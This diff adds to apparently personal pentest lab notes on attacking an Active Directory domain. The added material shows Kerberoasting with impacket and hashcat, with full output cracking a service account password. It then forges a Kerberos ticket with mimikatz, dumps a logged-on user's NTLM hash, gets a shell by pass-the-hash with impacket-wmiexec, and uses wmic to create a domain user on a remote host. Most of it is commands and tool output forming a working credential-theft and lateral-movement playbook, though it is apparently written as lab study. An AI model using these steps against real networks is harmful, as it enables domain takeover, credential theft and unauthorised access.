@@ -58,7 +58,8 @@
     # a case, on a host login by a domain account, request a TGS from DC to a spn
         sudo impacket-GetUserSPNs -request -dc-ip 192.168.1.121 goodboy.com/bob # to get TGS
 
-        # to brute force the TGS to get the passwd of the spn admin, if this account is a domain admin, did it.
+        # to brute force the TGS to get the passwd of the spn admin, if this account is a domain admin, crack it
+            will get the account of domain admin.
         # hashcat
         hashcat --help | grep -i "kerberos"                                                                  
         19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
@@ -71,8 +72,145 @@
         13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
         18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
 
-        hashcat -m 13100 hash.txt
+        sudo hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force
 
+        └─$ sudo hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force
+    hashcat (v6.2.6) starting
+
+    You have enabled --force to bypass dangerous warnings and errors!
+    This can hide serious problems and should only be done when debugging.
+    Do not report hashcat issues encountered when using --force.
+
+    OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+    ==================================================================================================================================================
+    * Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-1155G7 @ 2.50GHz, 1439/2943 MB (512 MB allocatable), 3MCU
+
+    Minimum password length supported by kernel: 0
+    Maximum password length supported by kernel: 256
+
+    Hashes: 1 digests; 1 unique digests, 1 unique salts
+    Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+    Rules: 1
+
+    Optimizers applied:
+    * Zero-Byte
+    * Not-Iterated
+    * Single-Hash
+    * Single-Salt
+
+    ATTENTION! Pure (unoptimized) backend kernels selected.
+    Pure kernels can crack longer passwords, but drastically reduce performance.
+    If you want to switch to optimized kernels, append -O to your commandline.
+    See the above message to find out about the exact limits.
+
+    Watchdog: Temperature abort trigger set to 90c
+
+    Host memory required for this attack: 0 MB
+
+    Dictionary cache built:
+    * Filename..: /usr/share/wordlists/rockyou.txt
+    * Passwords.: 14344392
+    * Bytes.....: 139921507
+    * Keyspace..: 14344385
+    * Runtime...: 3 secs
+
+    $krb5tgs$23$*sqladmin$GOODBOY.COM$goodboy.com/sqladmin*$c267c4a3924f057c0d9dc97340ba35fb$d875e551d4ef52d8ba15e3e3ae5e
+    8193c98f16f641b840db0c81621b2383ff47a5a059f59e4f6d8e11aa7da4a367e6023f6dce6b970df5b25b5faebba6c5f8a08864bc32241d6726
+    a1c235db55e12de8b8a6c193bedf54d52a6b2d55db51de0676a97bddaa898c94a02d263d9a59cac06726bf70d5feb646e9fff64faebfe08ad756
+    aaaf18861267cd27fda87857f8c818d52604e39edb7733e93390a460eb9ae28194212ba36f7cf8d66844ec1757e38b1f4da5ab5c725850e2a18
+    f3c365d22651e3fce2bc51c35facc09770d9a6ddadfa060ae3ea4f461b97a3ee682640677674c6d9dc32e4b541c0fd71b5018142780040f68ba
+    90d0d829567879b075d3f8fb65ed0bb2412b4f0158c416bb1cf220e537f6578a3d5af027cb04c99c8663abe1c944eadf2ec71af4a8bcd4d3827
+    b284ec7d80ccab929b5daaf319baf3728460eb3ce8d13954e2577a6092a68943c2db3571325ebf7dd749004df8ebf2525281e78f9e2bcc4fafb
+    fb0d20c330ec9bbb913f7d7eef998b5f73cc4916b6c046c6330f48efd456dcee6fb1c67c54f175cec83064401d33deed6de4ec70b4c2007be37
+    d45cf1b1c9fadc8352ce24855905c84b1894c4b179c885058c40d042cda0be466c5abc32fef0fafd7e1498eddbe7ddc20d6b70a09fc6474382
+    72b51295465512eb46449748630f993f968f11f2f2bd57d0ea1f390ab4f73b8a4ce5ebfff4826e1533553e63bdf8236759ee94bea19ea9e7303
+    4ec54f3bba1646306b414c0cc8d3a4007920dc47cf1fda08bea27670151bff3a5c52fb4c50c2113e9b3996afec8a491ab26c08cdc585ac24ea0
+    7aec71e49a2b2d2bf3ae41833e2084752464de48e8cb115f8907fe9b33fca95a7a2b5afea3b1b23db3a3bfbea262e3abf28fc37a4b9e5df0d23
+    be62125d44a2831494537bdc8383f5bcc5dbe7a2ddc95bd3ce88dfaa5ffe0b4e04a05f9b41773c1fca4658e1d5ebd50e7ade88e841316d689f8
+    f483468f8191257c4891fd5dc97e406565db7dd7501918e352f4fb5e71b5f24665a1bcbcf57c8ba97bee2f5ca494f3e4a4be11094401d33032c
+    cee9a3dc21f2a78572e75716ec6d96d3b19d473ff526934d3a0a9e0956bfbb05252aa95e335b73c6340f39d82fd8257ed47390187593fba236
+    a1e65955463ef0a609487f2dc3d05335c674c43c89629e55a6ed83e9be027607b0e70b5eca12c54bd68ac7d9d04ff7c001ee5fb9e5a611c278
+    16c4ef926135dff6a15c9c4a743076efddb0f8474a93cd896ce2f60f485e1a2aff5358ce9b0d3a12b74590418658253f733f55139d31f77482
+    010899e0134819a870becd61db0dcf25216fcaa90b476f74d797ce785b40b9d6f71961c4686223672149787819a05baf4820d5ddd1915d1a08
+    ff72bed279489851a09a6dc5024dff96024b664df4743511b9686b583a1c95c41a:Abc123!
+
+        # $GOODBOY.COM$goodboy.com/sqladmin*   is spn name
+        # sqladmin is service account, Abc123! is passwd
+
+        
+        PS C:\Users\alice> whoami /user
+
+        USER INFORMATION
+        ----------------
+
+        User Name     SID
+        ============= ==============================================
+        goodboy\alice S-1-5-21-1645150849-1307760504-3167438930-1104
+
+            1645150849-1307760504-3167438930  is the domain SID    
+
+        # create golden ticket
+        .\mimikatz  # only execute on Adminis account
+        mimikatz# privilege::debug # to read the ram area of other process
+
+        mimikatz # kerberos::golden /dis:S-1-5-21-1645150849-1307760504-3167438930-1104 /domain:goodboy.com /ptt 
+            target:sqladmin.goodboy.com /service:MSSQL /rc4:4DDEC0A4C1B022C5FD8503826FBFB7F2 /user:bob
+                # ppt means pass the ticket. rc4 is the NT hash of the passwd of user, need to convert to NThash like cyberchef
+
+        User      : bob
+        Domain    : goodboy.com
+        ServiceKey: 4ddec0a4c1b022c5fd8503826fbfb7f2 - rc4_hmac_nt
+        Service   : MSSQL
+        Lifetime  : 4/22/2024 3:49:15 PM ; 4/20/2034 3:49:15 PM ; 4/20/2034 3:49:15 PM
+        -> Ticket : ** Pass The Ticket **
+
+        * EncTicketPart generated
+        * EncTicketPart encrypted
+        * KrbCred generated
+
+        Golden ticket for 'bob @ goodboy.com' successfully submitted for current session
+
+
+
+        *************************************************mimikatz read the NTHM of a logon user to get a shell
+        #passed hash to login
+
+        .\mimikatz  # only execute on Adminis account
+
+        mimikatz# privilege::debug
+
+        mimikatz # sekurlsa::logonPasswords
+
+        Authentication Id : 0 ; 5450939 (00000000:00532cbb)
+        Session           : Interactive from 4
+        User Name         : alice
+        Domain            : GOODBOY
+        Logon Server      : WINSERV
+        Logon Time        : 4/22/2024 2:11:50 PM
+        SID               : S-1-5-21-1645150849-1307760504-3167438930-1104
+        msv :
+         [00000003] Primary
+         * Username : alice
+         * Domain   : GOODBOY
+         * NTLM     : 3766c17d09689c438a072a33270cb6f5 **
+         * SHA1     : 36109f7276f4bf2a557cf9594a9d4953f49aafd8
+         * DPAPI    : 8bbb66ff8e014dc5766cda97e61dec8c
+        
+         └─$ impacket-wmiexec -hashes :3766c17d09689c438a072a33270cb6f5 alice@192.168.1.121
+        Impacket v0.11.0 - Copyright 2023 Fortra
+
+        [*] SMBv3.0 dialect used
+        [!] Launching semi-interactive shell - Careful what you execute
+        [!] Press help for extra shell commands
+        C:\>ls
+        'ls' is not recognized as an internal or external command,
+        operable program or batch file.
+
+        C:\>whoami
+        goodboy\alice
+
+
+        wmic /node:"IP of another pc or dc" process call create "net user administator Passw0rd123 /domain"  # or "cmd"
       
 
 
